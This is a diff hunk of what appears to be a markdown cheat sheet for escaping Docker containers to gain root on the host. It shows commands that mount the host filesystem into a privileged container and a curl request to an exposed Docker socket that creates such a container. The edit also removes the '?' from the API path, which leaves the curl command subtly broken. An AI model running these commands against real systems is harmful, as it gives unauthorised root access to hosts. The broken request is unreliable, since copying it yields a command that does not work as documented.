@@ -44,13 +44,13 @@ docker run --rm -i --privileged -v /:/hostfs --user root \
 docker run -v /:/host -it alpine chroot /host /bin/bash
 ```
 
-## Docker Socket Exposed but No CLI?
+## Docker Socket Exposed but No CLI
 
 If `/var/run/docker.sock` is readable from an unprivileged user but `docker` is not installed:
 ```bash
 curl --unix-socket /var/run/docker.sock -X POST \
   -H "Content-Type: application/json" \
-  http://localhost/containers/create?name=pwn \
+  http://localhost/containers/createname=pwn \
   -d '{"Image":"alpine","Cmd":["sleep","infinity"],"HostConfig":{"Privileged":true,"Binds":["/:/hostfs"]}}'
 ```
 
